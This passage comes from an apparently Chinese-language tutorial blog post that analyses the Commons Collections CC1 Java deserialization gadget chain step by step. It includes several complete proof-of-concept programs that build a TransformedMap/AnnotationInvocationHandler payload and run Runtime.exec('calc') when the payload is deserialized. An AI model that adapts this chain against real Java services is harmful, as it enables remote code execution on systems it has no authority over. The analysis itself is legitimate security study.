<p>2.<strong>然后现在调用的就是数组第二个值的类实例化对象</strong>，也就是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>继续跟进</p>
<p><img src="/2024/08/13/CC1/image-20240720150016864.png" alt="image-20240720150016864"></p>
<p>注意看<code>input.getClass()</code>这一步过后的cls的值，居然变成了Class对象，这也是最开始没想通的（这里的Input不是一个类的实例化对象），也就是对任何<strong>类的class对象</strong>使用getClass()方法时都会返回<code>class java.lang.Class</code>。</p>
<p>然后这里调用getMethod()方法获取<code>Class对象</code>的<code>getMethod()</code>方法并在return的地方使用invoke()方法来获取<code>Runtime</code>类的<code>getRuntime()</code>方法（getRuntime方法为静态方法）</p>
<p>所以现在的object变为Runtime里面的<code>getRuntime()</code>方法。</p>
<p>3.继续，<strong>现在到了第三个值的类实例化对象</strong>，也就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>还是进入InvokerTransformer类的transform方法</p>
<p><img src="/2024/08/13/CC1/image-20240720155956708.png" alt="image-20240720155956708"></p>
<p>这里需要注意的同样的是getClass()那里，由于我传入的是一个getRuntime()<strong>方法对象</strong>，所以这里返回的是<code>class java.lang,reflect.Method</code>，然后使用反射获取Method类中的invoke方法，最后再在return部分调用invoke方法来利用反射获取的invoke()方法，形如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="comment">//这样就可以直接执行方法从而获取Runtime类的实例化对象，还是和这个方法是static有关</span></span><br></pre></td></tr></table></figure>

<p><em>所以在这里应该就是相当于直接执行getRuntime()方法</em>（<u>注意理解对比反射的知识点，这里的的用法需要理解记忆</u>）</p>
<p><strong>所以在这一步后可以获取到<code>new Runtime</code>的实例。</strong></p>
<p>即现在的object的值为Runtime类的实例</p>
<p>4.<strong>现在就到了数组的最后一个值</strong>，即：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>然后后面就是获取Runtime类的exec方法，并在invoke时传入calc弹出计算机。</p>
<p><strong>5.总结</strong></p>
<p>最后简单总结一下chain链中的流程：</p>
<ul>
<li>使用ConstantTransformer的transform方法返回Runtime.class</li>
<li>再在InvokerTransformer的transform方法获取getMethod方法并利用获取getRuntime()方法</li>
<li>再在InvokerTransformer的transform中获取invoke方法来调用getRuntime()方法从而获取到Runtime类实例。</li>
<li>最后还是在InvokerTransformer的transform方法获取到exec方法并传入calc弹出计算机</li>
</ul>
<p><u>分析结束。</u></p>
<p>其实还可以更简单，结合getRuntime()方法的特性，可以如下构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; String.class &#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;) &#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">ctf</span> <span class="operator">=</span>TransformedMap.decorate(hashMap,chain,<span class="literal">null</span>);</span><br><span class="line">        ctf.put(<span class="number">10</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样成功弹出计算机</p>
<p><img src="/2024/08/13/CC1/image-20240720165342215.png" alt="image-20240720165342215"></p>
<p>综上第二种的简化代码更简洁，第一种偏技巧性，都要理解学习利用。</p>
<p>但是第二种代码本身在具体的运用中并没有用，<strong>这是因为Runtime类并没有实现Serializable接口</strong>，而解决方法就是第一种，所以<u>在实际运用中还是使用的第一种。</u></p>
<h6 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h6><p>上面的代码只是一个用来在本地测试的类，并且是我们通过构造代码来启用第一个transform()方法继而实现的链子。在实际反序列化漏洞中，我们需要它的readObject代码逻辑中有类似Map.put方法的操作。</p>
<p>在这里可以利用到的类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。</p>
<p>现在来看这个类的readObject()方法（<strong>需要注意的是这是8u71以前的代码，8u71以后做了一些修改</strong>，这个后面再说）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重点关注foreach语句。在这里<code>Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()</code>用于遍历Map，可以参考这个<a href="https://blog.csdn.net/zuzhiang/article/details/118444885">文章</a>，而<code>String name = memberValue.getKey();</code>语句和<code>Object value = memberValue.getValue();</code>语句用于获取键值对。</p>
<p><img src="/2024/08/13/CC1/image-20240721143009475.png" alt="image-20240721143009475"></p>
<p>这里的重点就是这个<code>setValue()</code>方法了，这里简单给出这个调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler#readObject() ==&gt; AbstractInputCheckedMapDecorator$MapEntry#setValue() ==&gt;TransformedMap#checkSetValue</span><br></pre></td></tr></table></figure>

<p>在TransformedMap这里就可以启动前面构造的调用链</p>
<p><img src="/2024/08/13/CC1/image-20240722141710098.png" alt="image-20240722141710098"></p>
<p>同时在这里可以看出是利用的valueTransformer，所以在调用decorate()方法初始化时要不同于前面的基本代码，需要改位置，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,chain);</span><br></pre></td></tr></table></figure>

<p>这样才能保证成功调用。现在就围绕这条链子来进行阐述。</p>
<p>1.<strong>现在来看memberValues的赋值点：</strong></p>
<p><img src="/2024/08/13/CC1/image-20240721143312438.png" alt="image-20240721143312438"></p>
<p>这里由于AnnotationInvacationHandler属jdk内部类，无法直接引用且被实例化，所以只能<strong>利用反射</strong>获取构造方法，将修饰过的Map添加进去。</p>
<p>注意看AnnotationInvacationHandler的构造方法，<strong>简单说明一下参数问题</strong>：</p>
<ul>
<li><p>对于第一个参数<code>Class&lt;? extends Annotation&gt; type</code>，简单说明一下：形如**&lt;？ extends Collection&gt;** 这里<strong>？</strong>代表一个未知的类型，但是，这个未知的类型实际上是<strong>Collection</strong>的一个子类，<strong>Collection</strong>是这个通配符的上限。</p>
</li>
<li><p>同时看这个构造方法里面的 if 语句代码，这里只要满足任何一个条件就会进入到if语句，导致不能正常赋值。这里重点关注<code>!type.isAnnotation()</code>代码，这里的isAnnotation()函数就是用来判断<code>Class</code>对象是否是表示一个注解类型。所以这里需要一个传入一个注解类型的Annotation。也就是下图中有@的类：</p>
</li>
</ul>
<p><img src="/2024/08/13/CC1/image-20240721163908857.png" alt="image-20240721163908857"></p>
<p>选择上面得任意一个注解类型的类应该都是可以的</p>
<p>所以可以构造代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Clas.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDelaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">constructor1.newInstance(Rention.class,ctf);</span><br></pre></td></tr></table></figure>

<p>现在解决了memberValues值的问题。</p>
<p>2.<strong>继续看readObject()方法的源码</strong></p>
<p>为了方便学习，我们尝试直接拼接一下前面的总结出来的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)                                                             &#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,map2);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        o.readObject();</span><br><span class="line">        o.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再打断点调试发现是在readObject()地方出现问题，现在来跟一下readObject()的源码，打断点如下：</p>
<p><img src="/2024/08/13/CC1/image-20240722153629967.png" alt="image-20240722153629967"></p>
<p>先来看这两串代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">annotationType = AnnotationType.getInstance(type);</span><br><span class="line">和</span><br><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br></pre></td></tr></table></figure>

<p>简单看看结果：</p>
<p><img src="/2024/08/13/CC1/image-20240722155024311.png" alt="image-20240722155024311"></p>
<p>第一行代码将annotationType被赋值为了AnnotationType实例，所以第二行代码就会调用AnnotationType类的memberTypes()方法:	</p>
<p><img src="/2024/08/13/CC1/image-20240722155410345.png" alt="image-20240722155410345"></p>
<p>所以最终readObject()方法里面的memberTypes为HashMap类的实例。</p>
<p><strong>这里还要说明一个点</strong>，关于<code>for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())</code>这个循环遍历的代码问题，在打断点过程中，我发现如下打断点会直接结束：</p>
<p><img src="/2024/08/13/CC1/image-20240722155836575.png" alt="image-20240722155836575"></p>
<p>那就说明在我上面拼接的代码在反序的时候并没有成功进入到这个for语句中，我猜测是这个循环遍历的问题，去查看前面给的文章的举例代码，直接看测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Map&lt;Integer, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="number">1</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        map.put(<span class="number">2</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        map.put(<span class="number">3</span>, <span class="string">&quot;value3&quot;</span>);</span><br><span class="line">        map.put(<span class="number">4</span>, <span class="string">&quot;value4&quot;</span>);</span><br><span class="line">        map.put(<span class="number">5</span>, <span class="string">&quot;value5&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Integer key : map.keySet()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;key: &quot;</span> + key + <span class="string">&quot;  value: &quot;</span> + map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;成功进入循环遍历&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;key: &quot;</span> + entry.getKey() + <span class="string">&quot;  value: &quot;</span> + entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功输出</p>
<p><img src="/2024/08/13/CC1/image-20240722160534907.png" alt="image-20240722160534907"></p>
<p>但是当我使用如下代码测试：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Map&lt;Integer, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Integer key : map.keySet()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;key: &quot;</span> + key + <span class="string">&quot;  value: &quot;</span> + map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;成功进入循环遍历&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;key: &quot;</span> + entry.getKey() + <span class="string">&quot;  value: &quot;</span> + entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>却什么都没有，这个结果那就确实说明了<em>我们需要向Map中键入至少一对键值对才能成功进入到这个for循环。</em>后续有个问题，直接讲了：</p>
<p><img src="/2024/08/13/CC1/image-20240722161806463.png" alt="image-20240722161806463"></p>
<p>这里看readObject()源码，可以知道需要将这个值设置为String那么测试代码就可以改成如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)                                                             &#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;ceshi&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,map2);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        o.readObject();</span><br><span class="line">        o.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再调试成功进入for循环，但是并没有成功弹出计算机，那么继续打断点，如下打断点时会直接退出</p>
<p><img src="/2024/08/13/CC1/image-20240722162106738.png" alt="image-20240722162106738"></p>
<p>说明并没有进入这个if条件，那么现在重点关注memberType的赋值语句：</p>
<p><img src="/2024/08/13/CC1/image-20240722162221416.png" alt="image-20240722162221416"></p>
<p>再在if语句打一个断点，此时值的情况为：</p>
<p><img src="/2024/08/13/CC1/image-20240722162417339.png" alt="image-20240722162417339"></p>
<p>那么现在看一下这个调用的get方法，前面已经说过了memberTypes为HashMap类实例，那现在就看HashMap类的get方法，源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e;</span><br><span class="line">        <span class="keyword">return</span> (e = getNode(hash(key), key)) == <span class="literal">null</span> ? <span class="literal">null</span> : e.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那现在再如下打断点：</p>
<p><img src="/2024/08/13/CC1/image-20240722162852352.png" alt="image-20240722162852352"></p>
<p>调试跟进，发现最终其作用的点就是getNode()方法，这个方法会在哈希表中查找对应的节点，如果相匹配就会返回对应的节点，比如如果匹配到我设置的ceshi键和值value1，那么就会返回对应节点，否则就会返回null。</p>
<p>后续的如何匹配就是注释相关技术了，<strong>在这里想要成功通过的条件为</strong>：</p>
<ul>
<li><code>sun.reflect.annotation.AnnotationInvocationHandler</code>构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</li>
<li>被<code>TransformedMap.decorate</code>修饰的Map中必须有一个键名为X的元素</li>
</ul>
<p>所以在这里我们需要将键设置为value，因为注解类有名为value的方法：<br><img src="/2024/08/13/CC1/image-20240722164951400.png" alt="image-20240722164951400"></p>
<p>所以最终的可利用的POC：</p>
